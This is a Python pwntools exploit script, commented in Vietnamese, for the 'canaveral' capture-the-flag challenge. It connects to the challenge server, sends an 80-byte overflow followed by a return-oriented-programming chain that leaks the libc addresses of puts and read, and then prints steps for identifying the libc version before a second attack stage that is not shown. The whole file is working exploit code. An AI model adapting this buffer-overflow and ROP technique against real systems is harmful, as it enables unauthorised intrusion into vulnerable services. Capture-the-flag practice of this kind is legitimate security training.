from pwn import *

# --- Cấu hình ---
HOST = 'chal.sunshinectf.games'
PORT = 25603
BINARY_NAME = './canaveral'

elf = context.binary = ELF(BINARY_NAME, checksec=False)

# --- Các địa chỉ và gadget đã tìm thấy thủ công ---
# Đây là gadget 'pop rdi; ret' thực sự tồn tại trong file.
pop_rdi = 0x0000000000401303

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']
vuln_addr = elf.symbols['vuln']
padding = b'A' * 80

# --- Giai đoạn Leak địa chỉ ---
p = remote(HOST, PORT)

log.info("Bắt đầu leak địa chỉ của 'puts' và 'read'...")

# ROP chain để gọi puts(puts_got) rồi gọi puts(read_got)
rop_chain_leak = b''
rop_chain_leak += p64(pop_rdi)       # Đặt tham số cho puts()
rop_chain_leak += p64(puts_got)      # Tham số: địa chỉ của puts trong GOT
rop_chain_leak += p64(puts_plt)      # Gọi puts() để in ra địa chỉ thực
rop_chain_leak += p64(pop_rdi)       # Đặt tham số cho puts() lần nữa
rop_chain_leak += p64(read_got)      # Tham số: địa chỉ của read trong GOT
rop_chain_leak += p64(puts_plt)      # Gọi puts() để in ra địa chỉ thực
rop_chain_leak += p64(vuln_addr)     # Quay lại vuln để có thể tấn công lần 2

payload1 = padding + rop_chain_leak

p.sendlineafter(b'sequence: ', payload1)

# --- Xử lý output và tìm libc ---
p.recvline() # Bỏ qua dòng "Successful launch!..."

leaked_puts_raw = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_raw.ljust(8, b'\x00'))
leaked_read_raw = p.recvline().strip()
leaked_read_addr = u64(leaked_read_raw.ljust(8, b'\x00'))
p.close()

log.success(f"Leaked puts address: {hex(leaked_puts_addr)}")
log.success(f"Leaked read address: {hex(leaked_read_addr)}")

print("\n\n===== HƯỚNG DẪN TIẾP THEO =====")
print("1. Truy cập trang web: https://libc.rip/")
print("2. Dán các thông tin sau vào các ô tương ứng:")
print(f"   - Tên hàm: puts, Địa chỉ: {hex(leaked_puts_addr)}")
print(f"   - Tên hàm: read, Địa chỉ: {hex(leaked_read_addr)}")
print("3. Nhấn 'Find libc'. Tải về file libc phù hợp (thường là libc6_2.31).")
print("4. Đổi tên file đã tải thành 'libc.so.6' và đặt vào cùng thư mục.")
print("5. Chạy script tấn công cuối cùng ở dưới.")